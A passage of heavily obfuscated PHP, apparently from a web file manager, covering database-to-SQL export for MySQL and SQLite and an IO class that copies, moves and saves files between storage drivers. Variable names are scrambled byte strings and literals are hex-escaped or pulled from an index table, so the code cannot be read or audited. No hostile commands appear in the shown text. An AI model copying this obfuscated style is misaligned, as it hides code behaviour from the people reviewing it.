TEMP_FILES . $ ªÜÕÚ¶[1134] . date($ ªÜÕÚ¶[240]) . $ ªÜÕÚ¶[8]; del_dir($±Œµí®); mk_dir($±Œµí®); $Ú˜Õù¯š = $±Œµí® . $ ªÜÕÚ¶[1135]; $„è˜èä = $±Œµí® . $ ªÜÕÚ¶[1136]; $ƒœŞÃ½ = $Æ©ş²º == $ ªÜÕÚ¶[13] ? $ ªÜÕÚ¶[844] : $ ªÜÕÚ¶[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\x74\141\154\154\57\x64\x61\164\141\57{$ƒœŞÃ½}\56\x73\161\x6c", $±Œµí®); @touch($±Œµí® . $Æ©ş²º . $ ªÜÕÚ¶[828]); $ÑÎ·Íìœ = fopen($Ú˜Õù¯š, $ ªÜÕÚ¶[1111]); $Õõß×Îõ = fopen($„è˜èä, $ ªÜÕÚ¶[1111]); if ($Æ©ş²º == $ ªÜÕÚ¶[13]) { $³é±¾–Î = array_diff($³é±¾–Î, array($ ªÜÕÚ¶[824], $ ªÜÕÚ¶[825])); $íÊˆ½¡ = array($ ªÜÕÚ¶[1137], $ ªÜÕÚ¶[1138], $ ªÜÕÚ¶[1139]); fwrite($Õõß×Îõ, implode(PHP_EOL, $íÊˆ½¡) . PHP_EOL . PHP_EOL); foreach ($³é±¾–Î as $Üà®Ù§®) { $ß¿Ù¹îä = $this->sqlFromSqlite($Üà®Ù§®); if (!$ß¿Ù¹îä[$ ªÜÕÚ¶[13]]) { continue; } fwrite($Õõß×Îõ, $ß¿Ù¹îä[$ ªÜÕÚ¶[13]] . PHP_EOL . PHP_EOL); if (!in_array($Üà®Ù§®, $ûóê–ÍŞ)) { fwrite($ÑÎ·Íìœ, $ß¿Ù¹îä[$ ªÜÕÚ¶[844]] . PHP_EOL . PHP_EOL); } } } else { foreach ($³é±¾–Î as $Üà®Ù§®) { $ß¿Ù¹îä = $this->sqlFromMysql($Üà®Ù§®); if (!$ß¿Ù¹îä[$ ªÜÕÚ¶[844]]) { continue; } fwrite($ÑÎ·Íìœ, $ß¿Ù¹îä[$ ªÜÕÚ¶[844]] . PHP_EOL . PHP_EOL); if (!in_array($Üà®Ù§®, $ûóê–ÍŞ)) { fwrite($Õõß×Îõ, $ß¿Ù¹îä[$ ªÜÕÚ¶[13]] . PHP_EOL . PHP_EOL); } } } fclose($ÑÎ·Íìœ); fclose($Õõß×Îõ); $ıæÈÓ˜å = array($ ªÜÕÚ¶[844] => $Ú˜Õù¯š, $ ªÜÕÚ¶[13] => $„è˜èä); return $˜€†¶Èã ? $ıæÈÓ˜å[$˜€†¶Èã] : $ıæÈÓ˜å; } public function dbType($ø•¬Ìé° = false) { $ÖÇŒ× =& $_SERVER[…É¦À–]; $µ›×ËÙî = $ø•¬Ìé° ? $GLOBALS[$ÖÇŒ×[6]][$ÖÇŒ×[21]] : $this->database; $µ›×ËÙî = array_change_key_case($µ›×ËÙî); $å›ô·ş° = $µ›×ËÙî[$ÖÇŒ×[1012]]; if ($å›ô·ş° == $ÖÇŒ×[1009]) { $¶Šêó¥È = explode($ÖÇŒ×[4], $µ›×ËÙî[$ÖÇŒ×[1018]]); $å›ô·ş° = $¶Šêó¥È[0]; } $½á¨âî = array($ÖÇŒ×[1140] => $ÖÇŒ×[13], $ÖÇŒ×[957] => $ÖÇŒ×[844]); if (isset($½á¨âî[$å›ô·ş°])) { $å›ô·ş° = $½á¨âî[$å›ô·ş°]; } return $å›ô·ş°; } public function sqlFromMysql($é››çì, $Æ¿ÚøÕÓ = '') { $¡ÖãÖ¸Ó =& $_SERVER[…É¦À–]; $¾æÒş‰ = $this->model()->db(); $§´Ü¿â = $¾æÒş‰->query($¡ÖãÖ¸Ó[1141] . $é››çì . $¡ÖãÖ¸Ó[414]); if (!$§´Ü¿â || !$§´Ü¿â[0]) { return !1; } $ªŞÈÂÜ = _get($§´Ü¿â[0], $¡ÖãÖ¸Ó[1142], $¡ÖãÖ¸Ó[12]); if (!$ªŞÈÂÜ) { return !1; } $†îªÍœ = "\104\122\117\120\x20\x54\101\x42\114\105\x20\111\106\x20\105\x58\111\123\x54\x53\40\140{$é››çì}\x60\x3b" . PHP_EOL . $ªŞÈÂÜ . $¡ÖãÖ¸Ó[71]; if ($Æ¿ÚøÕÓ && $Æ¿ÚøÕÓ == $¡ÖãÖ¸Ó[844]) { return $†îªÍœ; } $Ù£¹¹’¿ = array_change_key_case($GLOBALS[$¡ÖãÖ¸Ó[6]][$¡ÖãÖ¸Ó[21]]); $ëòİê²ú = $Ù£¹¹’¿[$¡ÖãÖ¸Ó[1017]]; $‚èğÃç» = $¡ÖãÖ¸Ó[1143] . $ëòİê²ú . $¡ÖãÖ¸Ó[1144] . $é››çì . $¡ÖãÖ¸Ó[58]; $ÀÀ–Ô²› = $¡ÖãÖ¸Ó[1145] . $é››çì . $¡ÖãÖ¸Ó[945]; $Ç—éÍù¡ = $¾æÒş‰->query($‚èğÃç»); if (empty($Ç—éÍù¡)) { $Õ±é¾× = array($¡ÖãÖ¸Ó[844] => $¡ÖãÖ¸Ó[12], $¡ÖãÖ¸Ó[13] => $¡ÖãÖ¸Ó[12]); return $Æ¿ÚøÕÓ ? $Õ±é¾×[$Æ¿ÚøÕÓ] : $Õ±é¾×; } $é¶¹´ó– = $¾æÒş‰->query($ÀÀ–Ô²›); $˜”Î·¥ = $¡ÖãÖ¸Ó[12]; $¬ˆÇä¢¿ = array(); foreach ($é¶¹´ó– as $ù­Ÿğƒ§) { if (!$˜”Î·¥ && $ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1146]] == $¡ÖãÖ¸Ó[1147]) { $˜”Î·¥ = $ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1148]]; } if (isset($¬ˆÇä¢¿[$ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1146]]])) { $¬ˆÇä¢¿[$ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1146]]][$¡ÖãÖ¸Ó[1149]][] = $ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1148]]; continue; } $¬ˆÇä¢¿[$ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1146]]] = array($¡ÖãÖ¸Ó[1150] => $ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1146]], $¡ÖãÖ¸Ó[1149] => array($ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1148]]), $¡ÖãÖ¸Ó[1151] => $ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1152]] == $¡ÖãÖ¸Ó[88] ? 0 : 1); } $ÓÄòª¼² = array(); foreach ($¬ˆÇä¢¿ as $ù­Ÿğƒ§) { $š‚«à«ƒ = $ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1150]] == $¡ÖãÖ¸Ó[1147]; $öşø×àŠ = array($¡ÖãÖ¸Ó[1153], $ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1151]] == $¡ÖãÖ¸Ó[88] && !$š‚«à«ƒ ? $¡ÖãÖ¸Ó[1154] : $¡ÖãÖ¸Ó[12], $¡ÖãÖ¸Ó[1155], $¡ÖãÖ¸Ó[1156] . $é››çì . $¡ÖãÖ¸Ó[11] . ($š‚«à«ƒ ? $¡ÖãÖ¸Ó[1157] : $ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1150]]) . $¡ÖãÖ¸Ó[118], $¡ÖãÖ¸Ó[1158], $¡ÖãÖ¸Ó[118] . $é››çì . $¡ÖãÖ¸Ó[118], $¡ÖãÖ¸Ó[1159] . implode($¡ÖãÖ¸Ó[1160], $ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1149]]) . $¡ÖãÖ¸Ó[1161]); $ÓÄòª¼²[] = implode($¡ÖãÖ¸Ó[53], $öşø×àŠ) . $¡ÖãÖ¸Ó[71]; } $Ê€ìœã = array(); $’«ÀğÇÊ = array($¡ÖãÖ¸Ó[1162] => $¡ÖãÖ¸Ó[1163], $¡ÖãÖ¸Ó[1163] => $¡ÖãÖ¸Ó[1163], $¡ÖãÖ¸Ó[317] => $¡ÖãÖ¸Ó[344], $¡ÖãÖ¸Ó[316] => $¡ÖãÖ¸Ó[344]); foreach ($Ç—éÍù¡ as $ù­Ÿğƒ§) { $öşø×àŠ = array($¡ÖãÖ¸Ó[118] . $ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1164]] . $¡ÖãÖ¸Ó[118], isset($’«ÀğÇÊ[$ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1165]]]) ? $’«ÀğÇÊ[$ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1165]]] : $ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1166]], $ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1167]] == $¡ÖãÖ¸Ó[943] ? $¡ÖãÖ¸Ó[1168] : $¡ÖãÖ¸Ó[1169], $ù­Ÿğƒ§[$¡ÖãÖ¸Ó[1164]] == $˜”Î·¥ ? $¡ÖãÖ¸Ó[1170] : $¡ÖãÖ¸Ó[12], $ù­Ÿğƒ§[$¡ÖãÖ¸Ó[994]] ? strtoupper(str_replace($¡ÖãÖ¸Ó[11], $¡ÖãÖ¸Ó[12], $ù­Ÿğƒ§[$¡ÖãÖ¸Ó[994]])) : $¡ÖãÖ¸Ó[12]); $Ê€ìœã[] = trim(implode($¡ÖãÖ¸Ó[53], $öşø×àŠ)); } $•ìÍ­¤Ù = array($¡ÖãÖ¸Ó[1171] . $é››çì . $¡ÖãÖ¸Ó[1172], $¡ÖãÖ¸Ó[1173] . $é››çì . $¡ÖãÖ¸Ó[1174], implode($¡ÖãÖ¸Ó[50] . PHP_EOL, $Ê€ìœã), $¡ÖãÖ¸Ó[991]); $«šŸíÍ‹ = implode(PHP_EOL, array_merge($•ìÍ­¤Ù, $ÓÄòª¼²)); if ($Æ¿ÚøÕÓ && $Æ¿ÚøÕÓ == $¡ÖãÖ¸Ó[13]) { return $«šŸíÍ‹; } $Õ±é¾× = array($¡ÖãÖ¸Ó[844] => $†îªÍœ, $¡ÖãÖ¸Ó[13] => $«šŸíÍ‹); return $Æ¿ÚøÕÓ ? $Õ±é¾×[$Æ¿ÚøÕÓ] : $Õ±é¾×; } public function sqlFromSqlite($ï³¹ó­«, $•Ù•ÉÎ = '') { $ÃŞúëœù =& $_SERVER[…É¦À–]; $Á°Öíáü = $this->model()->db(); $·ÖÓ£ø® = "\x50\x52\101\x47\x4d\101\40\x54\101\x42\x4c\x45\x5f\x49\116\106\x4f\x20\x28\x27{$ï³¹ó­«}\x27\51"; $€Æ¿”éÖ = "\x53\105\114\105\103\x54\x20\52\x20\106\x52\x4f\x4d\40\x73\x71\154\151\164\145\137\x6d\141\163\164\x65\x72\x20\x57\x48\105\122\x45\x20\x74\x62\x6c\137\x6e\x61\155\145\40\75\x20\x27{$ï³¹ó­«}\x27"; $ÒşÊë¶å = $Á°Öíáü->query($·ÖÓ£ø®); if (empty($ÒşÊë¶å)) { $¸ôùı™ú = array($ÃŞúëœù[844] => $ÃŞúëœù[12], $ÃŞúëœù[13] => $ÃŞúëœù[12]); return $•Ù•ÉÎ ? $¸ôùı™ú[$•Ù•ÉÎ] : $¸ôùı™ú; } $É¬©üÇé = $Á°Öíáü->query($€Æ¿”éÖ); $‘•Î’Ø = $óñëšà¶ = array(); foreach ($É¬©üÇé as $Í±Ø¢¤­) { if ($Í±Ø¢¤­[$ÃŞúëœù[33]] == $ÃŞúëœù[308]) { $‘•Î’Ø[] = $Í±Ø¢¤­[$ÃŞúëœù[1175]]; } else { $óñëšà¶[$Í±Ø¢¤­[$ÃŞúëœù[32]]] = $Í±Ø¢¤­[$ÃŞúëœù[1175]]; } } $ÚÙÕàıª = array_merge(array($ÃŞúëœù[1171] . $ï³¹ó­« . $ÃŞúëœù[118]), $‘•Î’Ø, array_values($óñëšà¶)); $ÚÙÕàıª = implode($ÃŞúëœù[71] . PHP_EOL, $ÚÙÕàıª) . $ÃŞúëœù[71]; if ($•Ù•ÉÎ && $•Ù•ÉÎ == $ÃŞúëœù[13]) { return $ÚÙÕàıª; } $ôã–ß€ã = array(); $–ûóˆû‹ = array($ÃŞúëœù[1163] => $ÃŞúëœù[1176], $ÃŞúëœù[344] => $ÃŞúëœù[1177]); $Šñ›İÇ = $ÃŞúëœù[12]; foreach ($ÒşÊë¶å as $Í±Ø¢¤­) { if ($Í±Ø¢¤­[$ÃŞúëœù[57]] == $ÃŞúëœù[88]) { $Šñ›İÇ = $Í±Ø¢¤­[$ÃŞúëœù[32]]; } $¡Ìƒ´•î = array($ÃŞúëœù[414] . $Í±Ø¢¤­[$ÃŞúëœù[32]] . $ÃŞúëœù[414], isset($–ûóˆû‹[$Í±Ø¢¤­[$ÃŞúëœù[33]]]) ? $–ûóˆû‹[$Í±Ø¢¤­[$ÃŞúëœù[33]]] : $Í±Ø¢¤­[$ÃŞúëœù[33]], $Í±Ø¢¤­[$ÃŞúëœù[35]] == $ÃŞúëœù[88] ? $ÃŞúëœù[1168] : $ÃŞúëœù[1178] . $Í±Ø¢¤­[$ÃŞúëœù[56]], $Í±Ø¢¤­[$ÃŞúëœù[57]] == $ÃŞúëœù[88] ? $ÃŞúëœù[1179] : $ÃŞúëœù[12]); $ôã–ß€ã[] = trim(implode($ÃŞúëœù[53], $¡Ìƒ´•î)); } foreach ($óñëšà¶ as $•–«Šß° => $ÖåšòİÄ) { $‰„œ‘‡ = str_replace($ÃŞúëœù[1180] . $ï³¹ó­« . $ÃŞúëœù[11], $ÃŞúëœù[12], $•–«Šß°); $îôáˆêâ = str_replace(array($ÃŞúëœù[118], $ÃŞúëœù[1002]), $ÃŞúëœù[414], substr($ÖåšòİÄ, stripos($ÖåšòİÄ, $ÃŞúëœù[289]))); if ($‰„œ‘‡ == $ÃŞúëœù[1157]) { $·ˆ÷ˆ¦« = $ÃŞúëœù[1181] . $Šñ›İÇ . $ÃŞúëœù[1182]; } else { $·ˆ÷ˆ¦« = (stripos($‰„œ‘‡, $ÃŞúëœù[11]) ? $ÃŞúëœù[1183] : $ÃŞúëœù[12]) . ($ÃŞúëœù[1184] . $‰„œ‘‡ . $ÃŞúëœù[1185] . $îôáˆêâ); } $ôã–ß€ã[] = $·ˆ÷ˆ¦«; } $—Ïä¤Áõ = array($ÃŞúëœù[1186] . $ï³¹ó­« . $ÃŞúëœù[1187], $ÃŞúëœù[1188] . $ï³¹ó­« . $ÃŞúëœù[1189], implode($ÃŞúëœù[50] . PHP_EOL, $ôã–ß€ã), $ÃŞúëœù[1190]); $ÖÉÍÉ® = implode(PHP_EOL, $—Ïä¤Áõ); if ($•Ù•ÉÎ && $•Ù•ÉÎ == $ÃŞúëœù[844]) { return $ÖÉÍÉ®; } $¸ôùı™ú = array($ÃŞúëœù[844] => $ÖÉÍÉ®, $ÃŞúëœù[13] => $ÚÙÕàıª); return $•Ù•ÉÎ ? $¸ôùı™ú[$•Ù•ÉÎ] : $¸ôùı™ú; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ñ·ôê»Ñ, $•ÂÖ³œĞ) { $ıÒáÙÈÜ =& $_SERVER[…É¦À–]; $¡‡Ïµ²µ = $•ÂÖ³œĞ; $GLOBALS[$ıÒáÙÈÜ[1191]] = $ıÒáÙÈÜ[1192] . $ñ·ôê»Ñ; Hook::trigger($ıÒáÙÈÜ[1192] . $ñ·ôê»Ñ . $ıÒáÙÈÜ[1193], $¡‡Ïµ²µ); $›Ä‡­­ = self::driverMake($•ÂÖ³œĞ[0]); if (!$›Ä‡­­) { return !1; } if (method_exists($›Ä‡­­, $ñ·ôê»Ñ)) { $åÙö»ŒÌ = @call_user_func_array(array($›Ä‡­­, $ñ·ôê»Ñ), $•ÂÖ³œĞ); } else { if (method_exists($›Ä‡­­, $ıÒáÙÈÜ[1194])) { $åÙö»ŒÌ = @call_user_func_array(array($›Ä‡­­, $ñ·ôê»Ñ), $•ÂÖ³œĞ); } else { if (method_exists(self, $ñ·ôê»Ñ)) { $åÙö»ŒÌ = @call_user_func_array(array(self, $ñ·ôê»Ñ), $•ÂÖ³œĞ); } else { $åÙö»ŒÌ = call_user_func_array(array(parent, $ñ·ôê»Ñ), $•ÂÖ³œĞ); } } } Hook::trigger($ıÒáÙÈÜ[1192] . $ñ·ôê»Ñ . $ıÒáÙÈÜ[1195], $¡‡Ïµ²µ, $åÙö»ŒÌ); return $åÙö»ŒÌ; } public static function init($àÆÈï«·) { return self::driverMake($àÆÈï«·); } public static function copy($®®×ÔšÆ, $ğÓÕô´, $ŞÒóöµ› = false, $’Öß©˜„ = false) { return self::copyMoveStart($®®×ÔšÆ, $ğÓÕô´, $ŞÒóöµ›, $_SERVER[…É¦À–][575], $’Öß©˜„); } public static function move($”×Åí¢©, $í¸Æ¸½ö, $´á«ñ×ö = false, $šÊöùñÑ = false) { return self::copyMoveStart($”×Åí¢©, $í¸Æ¸½ö, $´á«ñ×ö, $_SERVER[…É¦À–][577], $šÊöùñÑ); } private static function copyMoveStart($Â‚·‰ªÎ, $Öí›€„Ò, $Ş¹¼–Ïí, $Ä”ø¨å, $ïôğ–Æ¢) { $İ°Ê¾úá =& $_SERVER[…É¦À–]; $™Î á‰¼ = array($Â‚·‰ªÎ, $Öí›€„Ò, $Ş¹¼–Ïí, $ïôğ–Æ¢); Hook::trigger($İ°Ê¾úá[1192] . $Ä”ø¨å . $İ°Ê¾úá[1193], $™Î á‰¼); $‚í†®Ù² = self::copyMove($Â‚·‰ªÎ, $Öí›€„Ò, $Ş¹¼–Ïí, $Ä”ø¨å, $ïôğ–Æ¢); Hook::trigger($İ°Ê¾úá[1192] . $Ä”ø¨å . $İ°Ê¾úá[1195], $™Î á‰¼, $‚í†®Ù²); return $‚í†®Ù²; } public static function saveFile($íƒú©«Ê, $²ƒ€İş£, $ëêÌ¯©Ù = true) { $ß»²»Ü© =& $_SERVER[…É¦À–]; $™¿Ò†ô = self::info($²ƒ€İş£); $¤‹‹á½› = self::driverMake($íƒú©«Ê); $Î¿íÄ‹Ù = self::driverMake($²ƒ€İş£); $›¹Á¤˜ = !1; if ($Î¿íÄ‹Ù->pathParse[$ß»²»Ü©[1196]]) { $›¹Á¤˜ = $Î¿íÄ‹Ù; $ÎÙÌóÅ = $Î¿íÄ‹Ù->pathParse[$ß»²»Ü©[1196]]; $Î¿íÄ‹Ù = self::driverMake($ÎÙÌóÅ); } if ($¤‹‹á½›->pathParse[$ß»²»Ü©[1196]]) { $Ó™Íıòó = $¤‹‹á½›->pathParse[$ß»²»Ü©[1196]]; $¤‹‹á½› = self::driverMake($Ó™Íıòó); } $ñÄâ¸†È = $Î¿íÄ‹Ù->pathFather($²ƒ€İş£); $ı×ûŒé‰ = !0; if (!$ëêÌ¯©Ù && self::driverIsSame($¤‹‹á½›, $Î¿íÄ‹Ù)) { $ı×ûŒé‰ = !1; } $Ú„ƒÙ”³ = self::copyFile($¤‹‹á½›, $íƒú©«Ê, $Î¿íÄ‹Ù, $ñÄâ¸†È, $™¿Ò†ô[$ß»²»Ü©[32]], $ı×ûŒé‰); if ($›¹Á¤˜) { $Ú„ƒÙ”³ = $›¹Á¤˜->getPathOuter($Ú„ƒÙ”³); } return $Ú„ƒÙ”³; } private static function copyMove($ÈŠ”×¦, $ÏéáôÀ‡, $ÂÎúÈÛá, $ÜëÜ×€‰, $ùÕ‹´”õ = false) { $²İÓ½©‰ =& $_SERVER[…É¦À–]; if (!$ÈŠ”×¦ || $ÈŠ”×¦ == $²İÓ½©‰[8] || !$ÏéáôÀ‡) { return !1; } ignore_timeout(); $¡åÍÜùÇ = self::driverMake($ÈŠ”×¦); $ãå°û†· = self::driverMake($ÏéáôÀ‡); $øÃææò” = $ÜëÜ×€‰ == $²İÓ½©‰[577]; $‚‹Ã– é = !1; if ($ãå°û†·->pathParse[$²İÓ½©‰[1196]]) { $‚‹Ã– é = $ãå°û†·; $ÏéáôÀ‡ = $ãå°û†·->pathParse[$²İÓ½©‰[1196]]; $ãå°û†· = self::driverMake($ÏéáôÀ‡); } if ($¡åÍÜùÇ->pathParse[$²İÓ½©‰[1196]]) { $ÈŠ”×¦ = $¡åÍÜùÇ->pathParse[$²İÓ½©‰[1196]]; $¡åÍÜùÇ = self::driverMake($ÈŠ”×¦); } self::check($¡åÍÜùÇ, $ÈŠ”×¦, $ãå°û†·, $ÏéáôÀ‡); Hook::trigger($²İÓ½©‰[1197], $¡åÍÜùÇ, $ÈŠ”×¦, $ãå°û†·, $ÏéáôÀ‡); $¼—‘İ›« = self::driverIsSame($¡åÍÜùÇ, $ãå°û†·); if ($¼—‘İ›«) { if ($ÜëÜ×€‰ == $²İÓ½©‰[577] && !method_exists($ãå°û†·, $²İÓ½©‰[1198]) && trim($ÏéáôÀ‡, $²İÓ½©‰[8]) == trim($ãå°û†·->pathFather($ÈŠ”×¦), $²İÓ½©‰[8])) { if ($¡åÍÜùÇ->pathThis($ÈŠ”×¦) != $ùÕ‹´”õ && !$¡åÍÜùÇ->isTypeObject()) { return $¡åÍÜùÇ->rename($ÈŠ”×¦, $ùÕ‹´”õ); } return $ãå°û†·->getPathOuter($ÈŠ”×¦); } if (method_exists($ãå°û†·, $ÜëÜ×€‰)) { return $ãå°û†·->{$ÜëÜ×€‰}($ÈŠ”×¦, $ÏéáôÀ‡, $ÂÎúÈÛá, $ùÕ‹´”õ); } } if ($¼—‘İ›« && $ÜëÜ×€‰ == $²İÓ½©‰[577] && $ãå°û†·->getType() == $²İÓ½©‰[106]) { $İç²±¦Š = $ãå°û†·->movePath($ÈŠ”×¦, $ÏéáôÀ‡, $ùÕ‹´”õ); if ($İç²±¦Š) { return $İç²±¦Š; } } $µÏ–¤æÙ = $¡åÍÜùÇ->isFile($ÈŠ”×¦); if (!$µÏ–¤æÙ && $ãå°û†·->getType() == $²İÓ½©‰[797] && $¡åÍÜùÇ->getType() == $²İÓ½©‰[106]) { $İç²±¦Š = $ãå°û†·->copyFolderFromIO($¡åÍÜùÇ, $ÈŠ”×¦, $ÏéáôÀ‡, $ÂÎúÈÛá, $øÃææò”, $ùÕ‹´”õ); } else { $İç²±¦Š = self::copyPath($¡åÍÜùÇ, $ÈŠ”×¦, $ãå°û†·, $ÏéáôÀ‡, $ÂÎúÈÛá, $øÃææò”, $µÏ–¤æÙ, $ùÕ‹´”õ); } if ($İç²±¦Š && $øÃææò”) { $¡åÍÜùÇ->remove($ÈŠ”×¦); } if ($‚‹Ã– é) { $İç²±¦Š = $‚‹Ã– é->getPathOuter($İç²±¦Š); } return $İç²±¦Š; } private static function check($¨ÁÌ¾¶¢, $ö·Š“Œß, $Ëéö½’Û, &$¯íûÍ¡²) { $Î˜°Ÿ½ =& $_SERVER[…É¦À–]; if (self::driverIsSame($¨ÁÌ¾¶¢, $Ëéö½’Û) && $¨ÁÌ¾¶¢->isFolder($ö·Š“Œß) && $¨ÁÌ¾¶¢->isParentOf($ö·Š“Œß, $¯íûÍ¡²)) { show_json(LNG($Î˜°Ÿ½[1199]), !1); } if (!$¨ÁÌ¾¶¢->exist($ö·Š“Œß)) { show_json(LNG($Î˜°Ÿ½[105]), !1); } } private static function copyPath($×¸ åŞ, $†øÜÊ®ö, $‘åÖø¥³, $Ù©Üø©³, $×Œ‡ªéĞ, $­±½ğ¹ª, $¯ıÅ¤ü¼, $ú­Í îÙ = false, $º—±ğÏ¹ = true) { $öÉœ¢Ğ =& $_SERVER[…É¦À–]; $êüæ¯áü = empty($ú­Í îÙ) && $ú­Í îÙ !== $öÉœ¢Ğ[198] ? $×¸ åŞ->pathThis($†øÜÊ®ö) : $ú­Í îÙ; if ($×Œ‡ªéĞ) { $ó¼ëÌşÈ = $‘åÖø¥³->fileNameExist($Ù©Üø©³, $êüæ¯áü); $Ä”Şšñ² = $êüæ¯áü; $êüæ¯áü = $‘åÖø¥³->fileNameAuto($Ù©Üø©³, $êüæ¯áü, $×Œ‡ªéĞ, !$¯ıÅ¤ü¼); if (!$ó¼ëÌşÈ || $Ä”Şšñ² != $êüæ¯áü) { $×Œ‡ªéĞ = !1; } if ($º—±ğÏ¹ && !$×Œ‡ªéĞ) { $‘åÖø¥³->_data[$öÉœ¢Ğ[1200]] = !0; } } if ($¯ıÅ¤ü¼) { return self::copyFile($×¸ åŞ, $†øÜÊ®ö, $‘åÖø¥³, $Ù©Üø©³, $êüæ¯áü, $­±½ğ¹ª); } if ($×Œ‡ªéĞ == REPEAT_RENAME_FOLDER) { $×Œ‡ªéĞ = !1; } $àÏ´ì½š = rtrim($Ù©Üø©³, $öÉœ¢Ğ[8]) . $öÉœ¢Ğ[8] . $êüæ¯áü; $şØîçˆå = $‘åÖø¥³->mkdir($‘åÖø¥³->getPath($àÏ´ì½š), $×Œ‡ªéĞ); $Ù©Üø©³ = $‘åÖø¥³->getPathInner($şØîçˆå); $Ú ÊåŸ¯ = $×¸ åŞ->listPath($†øÜÊ®ö, !0); $Ú ÊåŸ¯ = is_array($Ú ÊåŸ¯) ? $Ú ÊåŸ¯ : array($öÉœ¢Ğ[83] => array(), $öÉœ¢Ğ[82] => array()); $±³¦–³ = array_merge($Ú ÊåŸ¯[$öÉœ¢Ğ[83]], $Ú ÊåŸ¯[$öÉœ¢Ğ[82]]); foreach ($±³¦–³ as $«Üó”¸İ) { $Ñ„æ·­ = $«Üó”¸İ[$öÉœ¢Ğ[33]] == $öÉœ¢Ğ[200]; $†øÜÊ®ö = $×¸ åŞ->getPathInner($«Üó”¸İ[$öÉœ¢Ğ[84]]); $Î£ÖÜÆ€ = self::copyPath($×¸ åŞ, $†øÜÊ®ö, $‘åÖø¥³, $Ù©Üø©³, $×Œ‡ªéĞ, $­±½ğ¹ª, $Ñ„æ·­, !1, !1); if (!$Î£ÖÜÆ€) { IO::errorTips($öÉœ¢Ğ[1201] . $†øÜÊ®ö . $öÉœ¢Ğ[70] . $Ù©Üø©³); } } self::copyMoveKeepInfo($×¸ åŞ, $†øÜÊ®ö, $şØîçˆå); return $şØîçˆå; } private static function copyFile($°‚ïÙé, $¬ï†œùŠ, $¶šÇ‰äø, $Ğ´¸‹–Ÿ, $é±€½¢˜, $áÄÖêÏÚ) { $¥æªéÊè =& $_SERVER[…É¦À–]; $Ğ´¸‹–Ÿ = $¶šÇ‰äø->getPath(rtrim($Ğ´¸‹–Ÿ, $¥æªéÊè[8]) . $¥æªéÊè[8] . $é±€½¢˜); $ä€Éµş½ = $¥æªéÊè[1202] . time() . rand_string(5); Hook::trigger($¥æªéÊè[1203], $°‚ïÙé, $¬ï†œùŠ, $¶šÇ‰äø, $Ğ´¸‹–Ÿ, $é±€½¢˜, $ä€Éµş½); if (self::driverIsSame($°‚ïÙé, $¶šÇ‰äø)) { if ($áÄÖêÏÚ) { $¥–÷ªæÙ = $¶šÇ‰äø->moveFile($¬ï†œùŠ, $Ğ´¸‹–Ÿ); } else { $¥–÷ªæÙ = $¶šÇ‰äø->copyFile($¬ï†œùŠ, $Ğ´¸‹–Ÿ); } Hook::trigger($¥æªéÊè[1204], $°‚ïÙé, $¬ï†œùŠ, $¶šÇ‰äø, $Ğ´¸‹–Ÿ, $é±€½¢˜, $¥–÷ªæÙ); self::copyMoveKeepInfo($°‚ïÙé, $¬ï†œùŠ, $¥–÷ªæÙ); return $¥–÷ªæÙ; } $·Âœèç = TEMP_FILES; if ($GLOBALS[$¥æªéÊè[6]][$¥æªéÊè[89]][$¥æªéÊè[836]]) { $·Âœèç = $GLOBALS[$¥æªéÊè[6]][$¥æªéÊè[89]][$¥æªéÊè[836]]; } $Õ¶ÃŒó‚ = $·Âœèç; mk_dir($Õ¶ÃŒó‚); $ÆÔÙâŒ‡ = $Õ¶ÃŒó‚ . $ä€Éµş½; $®‡„Ø¦ = $ÆÔÙâŒ‡; $ÆÔÙâŒ‡ = $°‚ïÙé->download($¬ï†œùŠ, $ÆÔÙâŒ‡); $ÆÔÙâŒ‡ = $°‚ïÙé->iconvApp($ÆÔÙâŒ‡); if (substr($ÆÔÙâŒ‡, strlen($·Âœèç)) == $·Âœèç) { $áÄÖêÏÚ = !0; } $¥–÷ªæÙ = $¶šÇ‰äø->upload($Ğ´¸‹–Ÿ, $ÆÔÙâŒ‡, $áÄÖêÏÚ); self::remove($®‡„Ø¦); Hook::trigger($¥æªéÊè[1204], $°‚ïÙé, $¬ï†œùŠ, $¶šÇ‰äø, $Ğ´¸‹–Ÿ, $é±€½¢˜, $¥–÷ªæÙ); self::copyMoveKeepInfo($°‚ïÙé, $¬ï†œùŠ, $¥–÷ªæÙ); return $¥–÷ªæÙ; } private static function copyMoveKeepInfo($Ãş‡†, $Ñ±ùï¾÷, $Š‡İ‰â) { if (!$Š‡İ‰â) { return; } $ö»”·€ø = $Ãş‡†->info($Ñ±ùï¾÷); if (!is_array($ö»”·€ø)) { return; } IO::setModifyTime($Š‡İ‰â, $ö»”·€ø[$_SERVER[…É¦À–][85]]); } public static function pathFather($ÕùØ£ĞÂ) { $Ş•¦êŠè = IO::init($ÕùØ£ĞÂ); $»äÕ³¯ë = $Ş•¦êŠè->pathFather($Ş•¦êŠè->path); return $Ş•¦êŠè->getPathOuter($»äÕ³¯ë); } public static function fileOut($Äô–×¨î, $¸Ü£èËµ = false, $ú¹Í”½¸ = false, $ÔÓß®á = '') { $˜¤áìæ€ = self::driverMake($Äô–×¨î); if ($˜¤áìæ€->isFileOutServer()) { return $˜¤áìæ€->fileOutServer($Äô–×¨î, $¸Ü£èËµ, $ú¹Í”½¸, $ÔÓß®á); } return $˜¤áìæ€->fileOut($Äô–×¨î, $¸Ü£èËµ, $ú¹Í”½¸, $ÔÓß®á); } public static function fileOutImage($Š¸ÃÂÁ, $‹ÇÂãÁÕ = 250) { $Ë­‚Ö ô = array(250, 600, 1200, 2000, 3000, 5000); 